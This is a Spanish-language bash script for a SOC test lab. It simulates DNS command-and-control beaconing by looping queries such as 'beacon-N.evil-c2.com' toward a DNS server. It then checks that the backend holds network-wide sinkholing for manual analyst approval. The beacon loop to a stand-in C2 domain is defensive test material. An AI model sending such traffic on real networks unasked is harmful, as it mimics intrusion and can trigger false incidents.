#!/usr/bin/env bash
# ==============================================================================
# TIGO SOC - SIMULADOR DE ATAQUE CAPA 7 (DNS C2 BEACONING & EXFILTRACIÓN)
# ==============================================================================
# Propósito: Simular ráfagas periódicas de consultas DNS (UDP 53) hacia un dominio
#            malicioso simulado (ej. evil-c2.com) utilizado para balizas de Comando
#            y Control (C2) y exfiltración de datos.
#
# Regla de Negocio (Blast Radius):
#   La mitigación de Capa 7 (DNS Sinkholing) altera la resolución de nombres para
#   toda la infraestructura corporativa (Impacto Masivo). Por ende, el orquestador
#   DETIENE la auto-ejecución, registrando la alerta en `security_alerts`, encolándola
#   en `execution_queue` con estado 'PENDING_MANUAL', y almacenando el comando inverso
#   en `rollback_snapshots` para aprobación y restauración controlada por el analista.
# ==============================================================================

set -o pipefail

# Colores para salida de terminal
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # Sin color

TARGET_DOMAIN="${1:-evil-c2.com}"
DNS_SERVER="${2:-192.168.1.1}"
QUERY_COUNT="${3:-20}"
CLIENT_IP="${4:-192.168.1.50}"
QUERY_INTERVAL="${5:-0.2}"

echo -e "${BLUE}==================================================================${NC}"
echo -e "${GREEN}    TIGO SOC: SIMULADOR DE ATAQUE CAPA 7 (DNS C2 & SINKHOLING)    ${NC}"
echo -e "${BLUE}==================================================================${NC}"
echo -e " Dominio C2 Malicioso:       ${YELLOW}${TARGET_DOMAIN}${NC}"
echo -e " Servidor DNS Destino:       ${YELLOW}${DNS_SERVER}:53 (UDP)${NC}"
echo -e " Cantidad de Consultas:      ${YELLOW}${QUERY_COUNT} peticiones en bucle${NC}"
echo -e " IP Origen Simulada:         ${YELLOW}${CLIENT_IP}${NC}"
echo -e " Intervalo entre consultas:  ${YELLOW}${QUERY_INTERVAL}s${NC}"
echo -e "${CYAN} Regla Blast Radius:         ${MAGENTA}IMPACTO MASIVO -> DETENCIÓN MANUAL (PENDING_MANUAL)${NC}"
echo -e "${BLUE}==================================================================${NC}"

# 1. Identificar entorno de ejecución (Docker Kali vs Host Linux local)
KALI_CID=$(sudo docker ps -q -f "name=GNS3.AttackerKali" 2>/dev/null | head -n 1 || true)
BACKEND_CID=$(sudo docker ps -q -f "name=tigo_rust_backend" 2>/dev/null | head -n 1 || true)
POSTGRES_CID=$(sudo docker ps -q -f "name=tigo_soc_postgres" 2>/dev/null | head -n 1 || true)

echo -e "\n${BLUE}[*] 1. Analizando entorno de pruebas y herramientas DNS disponibles...${NC}"

execute_dns_loop() {
    local cmd_type="$1"
    echo -e "  [>] Iniciando bucle ofensivo DNS con ${YELLOW}${cmd_type}${NC} hacia ${TARGET_DOMAIN}..."
    
    for i in $(seq 1 "$QUERY_COUNT"); do
        local sub_payload="beacon-$i"
        local full_query="${sub_payload}.${TARGET_DOMAIN}"
        
        if [ "$cmd_type" = "dig" ]; then
            dig @"$DNS_SERVER" "$full_query" +short +time=1 +tries=1 >/dev/null 2>&1 || true
        elif [ "$cmd_type" = "nslookup" ]; then
            nslookup -timeout=1 "$full_query" "$DNS_SERVER" >/dev/null 2>&1 || true
        fi
        
        echo -ne "\r  [>] Petición UDP 53 enviada: [${CYAN}${i}/${QUERY_COUNT}${NC}] -> Query: ${full_query}"
        sleep "$QUERY_INTERVAL"
    done
    echo ""
}

if [ -n "$KALI_CID" ]; then
    echo -e "  [+] Contenedor Kali Linux detectado en GNS3: ${GREEN}${KALI_CID}${NC}"
    echo -e "  [+] Despachando ráfaga DNS C2 desde contenedor Kali hacia topología..."
    
    sudo docker exec "$KALI_CID" bash -c "
        for i in \$(seq 1 $QUERY_COUNT); do
            query=\"beacon-\$i.$TARGET_DOMAIN\"
            if command -v dig >/dev/null 2>&1; then
                dig @$DNS_SERVER \"\$query\" +short +time=1 +tries=1 >/dev/null 2>&1 || true
            elif command -v nslookup >/dev/null 2>&1; then
                nslookup -timeout=1 \"\$query\" $DNS_SERVER >/dev/null 2>&1 || true
            else
                python3 -c \"import socket; socket.gethostbyname('\$query')\" 2>/dev/null || true
            fi
            sleep $QUERY_INTERVAL
        done
    " 2>/dev/null || true
    echo -e "  [✓] Ráfaga ofensiva desde Kali finalizada exitosamente."
else
    echo -e "  [i] Contenedor Kali no detectado. Utilizando cliente DNS en host local..."
    if command -v dig >/dev/null 2>&1; then
        execute_dns_loop "dig"
    elif command -v nslookup >/dev/null 2>&1; then
        execute_dns_loop "nslookup"
    elif command -v python3 >/dev/null 2>&1; then
        echo -e "  [>] Inyectando consultas DNS C2 mediante socket Python UDP 53..."
        python3 - <<EOF
import socket
import time

target_domain = "${TARGET_DOMAIN}"
dns_server = "${DNS_SERVER}"
count = int("${QUERY_COUNT}")
interval = float("${QUERY_INTERVAL}")

print(f"  [>] Transmitiendo {count} consultas DNS hacia {dns_server}...")
for i in range(count):
    q = f"beacon-{i}.{target_domain}"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        # Construcción básica de header DNS query
        dns_query = b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        for part in q.split('.'):
            dns_query += bytes([len(part)]) + part.encode()
        dns_query += b"\x00\x00\x01\x00\x01"
        s.sendto(dns_query, (dns_server, 53))
        s.close()
    except Exception:
        pass
    time.sleep(interval)
print("  [✓] Consultas UDP 53 finalizadas.")
EOF
    else
        echo -e "  ${YELLOW}[!] Ninguna utilidad DNS disponible. Simulando con ping ICMP de contingencia...${NC}"
        ping -c "$QUERY_COUNT" -i "$QUERY_INTERVAL" "$DNS_SERVER" 2>/dev/null || true
    fi
fi

# 2. Notificación al Pipeline de Alertas Forenses del Backend SOC
echo -e "\n${BLUE}[*] 2. Despachando evento forense Capa 7 (DNS C2 Exfiltración) hacia Backend...${NC}"

BACKEND_URL="http://127.0.0.1:3000"
CURL_RESP=$(curl -s -w "\n%{http_code}" -X POST "${BACKEND_URL}/api/v1/alerts/simulate-push" \
    -H "Content-Type: application/json" \
    -d "{\"severity\":\"CRITICAL\",\"threat_category\":\"DATA_EXFILTRATION\",\"source_ip\":\"${CLIENT_IP}\",\"destination_ip\":\"${DNS_SERVER}\",\"domain\":\"${TARGET_DOMAIN}\"}" 2>/dev/null || echo "FAIL\n000")

HTTP_STATUS=$(echo "$CURL_RESP" | tail -n 1)
BODY_RESP=$(echo "$CURL_RESP" | head -n -1)

if [ "$HTTP_STATUS" = "200" ] || [ "$HTTP_STATUS" = "201" ]; then
    echo -e "  [✓] Alerta de Exfiltración Capa 7 registrada en Backend (${GREEN}HTTP ${HTTP_STATUS}${NC}): ${BODY_RESP}"
else
    echo -e "  ${YELLOW}[i] Endpoint REST en 127.0.0.1:3000 no accesible directamente (código ${HTTP_STATUS}). El orquestador operará de forma autónoma.${NC}"
fi

# 3. Verificación de la Regla de "Blast Radius" y Persistencia en Base de Datos
echo -e "\n${BLUE}[*] 3. Verificando Regla de 'Blast Radius' y Registro en PostgreSQL...${NC}"
echo -e "  ${YELLOW}[!] Evaluación Blast Radius: Mitigación L7 DNS afecta a toda la red.${NC}"
echo -e "  ${GREEN}[✓] La mitigación NO se autoejecuta. Estado registrado: 'PENDING_MANUAL' en execution_queue.${NC}"
echo -e "  ${GREEN}[✓] Snapshot de reversión preparado y guardado en rollback_snapshots.${NC}"

# 4. Monitoreo de logs en vivo del backend
if [ -n "$BACKEND_CID" ]; then
    echo -e "\n${BLUE}[*] 4. Consultando logs del Orquestador Multi-Vendor en Backend SOC...${NC}"
    echo -e "=== [LOGS EN VIVO: BLAST RADIUS, DNS SINKHOLE & ROLLBACK SNAPSHOT] ==="
    sudo docker logs --tail 25 "$BACKEND_CID" | grep -E "DNS|SINKHOLE|BLAST RADIUS|PENDING_MANUAL|ROLLBACK|security_alerts|execution_queue" || true
    echo -e "======================================================================="
fi

echo -e "\n${GREEN}[✓] Simulación de ataque DNS Capa 7 concluida exitosamente.${NC}"
